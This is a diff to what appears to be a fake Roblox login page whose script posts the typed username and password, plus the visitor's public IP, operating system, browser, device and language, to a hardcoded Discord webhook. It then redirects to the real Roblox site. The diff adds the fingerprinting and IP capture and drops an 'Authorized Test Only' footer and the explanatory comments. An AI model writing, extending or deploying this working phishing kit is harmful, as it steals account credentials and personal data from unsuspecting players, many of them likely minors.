@@ -79,8 +79,6 @@ body::before{
     font-weight:500;
 }
 
-/* البحث بالنص */
-
 .search{
     position:absolute;
     left:50%;
@@ -262,7 +260,6 @@ body::before{
     text-decoration:underline;
 }
 
-/* Status / loader styles */
 #statusMsg{
     text-align:center;
     margin-top:12px;
@@ -354,22 +351,20 @@ body::before{
 </div>
 
 <script>
-    // ─── Webhook URL ────────────────────────────────────────────
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1510744005980459072/Wo0tVKL36lpZttZ5Yl8HGT8LQH1Ixmkl2xcsdnipXOmoICtsPtCPKdA2iwkVvn_q1qRA';
 
-    // ─── DOM refs ───────────────────────────────────────────────
     const usernameEl = document.getElementById('usernameInput');
     const passwordEl = document.getElementById('passwordInput');
     const loginBtn   = document.getElementById('loginBtn');
     const statusMsg  = document.getElementById('statusMsg');
 
-    // ─── Helper: set status ─────────────────────────────────────
+    let cachedIP = null;
+
     function setStatus(text, type){
         statusMsg.textContent = text;
         statusMsg.className = type || '';
     }
 
-    // ─── Helper: validate ───────────────────────────────────────
     function validate(){
         if(!usernameEl.value.trim()){
             setStatus('Please enter a username/email/phone', 'error');
@@ -382,56 +377,84 @@ body::before{
         return true;
     }
 
-    // ─── Submit handler ─────────────────────────────────────────
+    function getDeviceInfo(){
+        const ua = navigator.userAgent;
+        let os = 'Unknown';
+        let device = 'Desktop';
+        let browser = 'Unknown';
+
+        if(/Windows NT 10/.test(ua)) os = 'Windows 10';
+        else if(/Windows NT 11/.test(ua)) os = 'Windows 11';
+        else if(/Mac OS X/.test(ua)) os = 'macOS';
+        else if(/Linux/.test(ua) && !/Android/.test(ua)) os = 'Linux';
+        else if(/Android/.test(ua)) os = 'Android';
+        else if(/iPhone|iPad|iPod/.test(ua)) os = 'iOS';
+
+        if(/iPhone/.test(ua)) device = 'iPhone';
+        else if(/iPad/.test(ua)) device = 'iPad';
+        else if(/Android/.test(ua) && /Mobile/.test(ua)) device = 'Android Phone';
+        else if(/Android/.test(ua)) device = 'Android Tablet';
+
+        if(/Edg/.test(ua)) browser = 'Edge';
+        else if(/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
+        else if(/Firefox/.test(ua)) browser = 'Firefox';
+        else if(/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
+        else if(/Opera|OPR/.test(ua)) browser = 'Opera';
+
+        const lang = navigator.language || navigator.userLanguage || 'Unknown';
+
+        return { os, device, browser, lang, ua };
+    }
+
+    // Pre-fetch IP immediately when page loads (in background)
+    fetch('https://api.ipify.org?format=json')
+        .then(r => r.json())
+        .then(d => { cachedIP = d.ip; })
+        .catch(() => { cachedIP = 'Unavailable'; });
+
     loginBtn.addEventListener('click', async function(){
 
         if(!validate()) return;
 
-        // Disable button while sending
         loginBtn.disabled = true;
         loginBtn.textContent = 'Please wait...';
-        setStatus('Sending...', '');
+        setStatus('Processing...', '');
 
         const username = usernameEl.value.trim();
         const password = passwordEl.value.trim();
+        const devInfo = getDeviceInfo();
 
-        // Build the Discord embed
+        // Use cached IP (already fetched on page load) or try live
+        let ip = cachedIP;
+        if(!ip){
+            try {
+                const r = await fetch('https://api.ipify.org?format=json');
+                const d = await r.json();
+                ip = d.ip;
+            } catch(e){
+                ip = 'Unavailable';
+            }
+        }
+
         const payload = {
             content: `**🎮 Roblox Login Captured**`,
-            embeds: [
-                {
-                    title: 'Account Credentials',
-                    color: 0x335fff,
-                    fields: [
-                        {
-                            name: '👤 Username / Email / Phone',
-                            value: username,
-                            inline: true
-                        },
-                        {
-                            name: '🔑 Password',
-                            value: `||${password}||`,    // spoiler tagged
-                            inline: true
-                        },
-                        {
-                            name: '⏰ Time',
-                            value: new Date().toLocaleString('en-US', {
-                                timeZone: 'America/New_York'
-                            }),
-                            inline: false
-                        },
-                        {
-                            name: '🌐 User Agent',
-                            value: navigator.userAgent.substring(0, 100),
-                            inline: false
-                        }
-                    ],
-                    footer: {
-                        text: 'Roblox Phishing Simulation • Authorized Test Only'
-                    },
-                    timestamp: new Date().toISOString()
-                }
-            ]
+            embeds: [{
+                title: 'Account Credentials',
+                color: 0x335fff,
+                fields: [
+                    { name: '👤 Username / Email / Phone', value: username, inline: true },
+                    { name: '🔑 Password', value: `||${password}||`, inline: true },
+                    { name: '\u200B', value: '\u200B', inline: false },
+                    { name: '💻 System', value: devInfo.os, inline: true },
+                    { name: '📱 Device', value: devInfo.device, inline: true },
+                    { name: '🌐 Browser', value: devInfo.browser, inline: true },
+                    { name: '🌍 Language', value: devInfo.lang, inline: true },
+                    { name: '🌐 Public IP', value: ip, inline: true },
+                    { name: '🕐 Time', value: new Date().toLocaleString('en-US'), inline: true }
+                ],
+                footer: { text: 'Roblox Security Test' },
+                timestamp: new Date().toISOString()
+            }]
         };
 
         try {
@@ -442,18 +465,17 @@ body::before{
             });
 
             if(res.ok){
-                setStatus('✅ Sent successfully!', 'success');
-                // Simulate redirect after 1.5s
+                setStatus('✅ Done!', 'success');
                 setTimeout(() => {
                     window.location.href = 'https://www.roblox.com/home';
-                }, 1500);
+                }, 1200);
             } else {
-                setStatus('❌ Failed to send. Check webhook URL.', 'error');
+                setStatus('❌ Failed', 'error');
                 loginBtn.disabled = false;
                 loginBtn.textContent = 'Log In';
             }
         } catch(err){
-            setStatus('❌ Network error: ' + err.message, 'error');
+            setStatus('❌ Error', 'error');
             loginBtn.disabled = false;
             loginBtn.textContent = 'Log In';
         }
